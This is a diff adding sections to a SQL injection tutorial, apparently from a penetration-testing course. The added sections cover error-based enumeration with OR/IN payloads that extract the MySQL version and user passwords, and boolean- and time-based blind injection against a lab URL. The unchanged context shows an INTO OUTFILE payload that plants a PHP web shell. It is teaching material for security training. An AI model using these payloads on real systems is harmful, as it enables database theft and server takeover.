@@ -153,13 +153,41 @@ The AND operator will be evaluated first, and it will return false. Then, the OR
 
 ![Login as admin](../../../../images/sqli5.png)
 
-You were able to log in successfully as admin. However, the login fails when using 'notAdmin' as a user, since that user does not exist in the table and therefore resulted in a fals query overall.
+You were able to log in successfully as admin. However, the login fails when using 'notAdmin' as a user, since that user does not exist in the table and therefore resulted in a false query overall.
 
 To successfully login once again, you will need an overall true query. This can be achieved by injecting an OR condition into the password field, so it will always return true.
 
 ![Login as notAdmin](../../../../images/sqli6.png)
 
 The additional OR condition resulted in a true query overall, as the WHERE clause returns everything in the table, and the user present in the first row is logged in. In this case, as both conditions will return true, you do not have to provide a test username and password and can directly start with ```'``` injection and log in with just ```' or '1'='1```.
+
+### Enum with OR Operator
+
+If the web app provides error information on bad queries, you could use the OR operator to enumerate the system.
+
+```
+' or 1=1 in (select @@version) -- //
+```
+
+You want to force the SQL statement to create a database error that the web page will display back to you. In this case, you want to retrieve the MySQL version via the `@@version` directive. You're using the IN operator to compare a boolean value (`1=1`) with what should be a numeric value. If this causes an error, the application might indicate which values caused the error and thus allow you to get the database version number.
+
+Dumping all the data inside the users table.
+
+```
+' OR 1=1 in (SELECT * FROM users) -- //
+```
+
+Trying to grab only the password column from the users table.
+
+```
+' or 1=1 in (SELECT password FROM users) -- //
+```
+
+Specifying which user's password you want to retrieve:
+
+```
+' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
+```
 
 ## Using comments
 
@@ -590,6 +618,38 @@ cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/
 If there are no errors, you can now browse to ```/shell.php``` and execute commands via the parameter ```0```, with ```?0=id``` in your URL.
 
 ![web shell](../../../../images/sqli21.png)
+
+## Blind SQL Injection
+
+Blind SQL injections describe scenarios in which databse responses are never returned and behavior is inferred using either boolean- or time-based logic.
+
+As an example, generic boolean-based blind SQLi cause the application to return different and predictable values whenever the database query returns a TRUE or FALSE result, hence the "boolean" name. These values can be reviewed within the application context.
+
+Time-based blind SQLi infer the query by instructing the database to wait for a specified amount of time. Based on the response time, the attacker can conclude if the statement is TRUE or FALSE.
+
+After encountering the following page:
+
+![sqli offsec 1](../../../../images/sqli_offsec1.png)
+
+... and closely reviewing the URL, you'll notice that the application takes a user parameter as input, defaulting to `offsec` since this is your current logged-in user. The application then queries the user's record, returning the username, password, hash, and description values.
+
+To test for boolean-based SQLi, you can try to append the below payload to the URL:
+
+```
+http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
+```
+
+Sine `1=1` will always be TRUE, the application will return the values only if the user is present in the database. Using this syntax, you could enumerate the entire database for other usernames or even extend your SQL query to verify data in other tables.
+
+You can achieve the same result by using a time-based SQLi payload:
+
+```
+http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
+```
+
+In this case, you appended an IF condition that will always be true inside the statement itself but will return false if the user is non-existent.
+
+You know that the user `offsec` is active, so if you paste the above URL payload into your Kali VM's browser, you'll notice that the application hangs for about three seconds.
 
 ## SQLi Mitigation
 
